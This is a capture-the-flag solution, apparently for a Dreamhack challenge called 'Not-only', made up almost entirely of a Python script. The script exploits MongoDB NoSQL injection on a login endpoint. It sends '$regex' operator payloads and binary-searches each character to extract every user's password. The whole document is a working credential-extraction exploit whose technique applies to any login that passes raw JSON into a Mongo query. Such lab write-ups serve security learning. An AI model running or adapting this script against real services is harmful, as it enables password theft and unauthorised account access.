# Not-only
This challenge involves sqli mongodb

## Solve script
```python
import re
import requests
from pathlib import Path
import string
import time

BASE = "http://host8.dreamhack.games:16426"  # change if needed
DBSQL = Path("deploy") / "db.sql"
MAX_LEN = 64  # maximum password length to probe
CHAR_MIN = 32   # printable range start
CHAR_MAX = 126  # printable range end

def load_users(dbsql_path):
    txt = dbsql_path.read_text()
    return re.findall(r'db\.user\.insert\(\{"uid":\s*"([^"]+)"', txt)

def check_payload(payload, timeout=8):
    # use a fresh session per attempt so cookies don't persist
    with requests.Session() as s:
        r = s.post(f"{BASE}/login", json=payload, timeout=timeout, allow_redirects=True)
        # success -> redirect to /user, requests sets final url
        return r.url.endswith('/user')

def enum_password_binary(uid):
    prefix = ""
    for pos in range(MAX_LEN):
        # first check if there is any character at this position
        payload_exist = {"uid": uid, "upw": {"$regex": "^" + re.escape(prefix) + "."}}
        if not check_payload(payload_exist):
            break  # password ended

        low = CHAR_MIN
        high = CHAR_MAX
        found_char = None
        while low <= high:
            mid = (low + high) // 2
            # build regex that checks if char at pos <= mid (use hex escape for upper bound)
            upper_hex = f"\\x{mid:02x}"
            regex = "^" + re.escape(prefix) + f"[\\x00-{upper_hex}]"
            payload = {"uid": uid, "upw": {"$regex": regex}}
            if check_payload(payload):
                # there exists a password whose current char <= mid, so upper bound becomes mid
                found_char_code = mid
                found_char = chr(found_char_code)
                high = mid - 1
            else:
                low = mid + 1
            time.sleep(0.01)
        if found_char is None:
            break
        # after binary search, found_char holds the smallest char that satisfies <= mid;
        # we should verify exact character by probing equality via regex for that char
        test_regex = "^" + re.escape(prefix + found_char)
        payload_test = {"uid": uid, "upw": {"$regex": test_regex}}
        if check_payload(payload_test):
            prefix += found_char
            print(f"{uid}: pos {pos} -> {found_char}")
        else:
            # sometimes binary search may converge to a codepoint not actually present (edge cases).
            # fallback: try brute force around the found_code
            success = False
            for code in range(max(CHAR_MIN, ord(found_char)-2), min(CHAR_MAX, ord(found_char)+3)+1):
                ch = chr(code)
                payload_test = {"uid": uid, "upw": {"$regex": "^" + re.escape(prefix + ch)}}
                if check_payload(payload_test):
                    prefix += ch
                    print(f"{uid}: pos {pos} -> {ch} (fallback)")
                    success = True
                    break
            if not success:
                break
    return prefix

if __name__ == "__main__":
    users = load_users(DBSQL)
    print("Found users:", users)
    results = {}
    for u in users:
        print("Enumerating", u)
        try:
            pw = enum_password_binary(u)
            results[u] = pw
            print(f"{u} => {pw}")
        except Exception as e:
            print("error for", u, e)
    print("Done. Results:")
    for u, p in results.items():
        print(u, p)
```
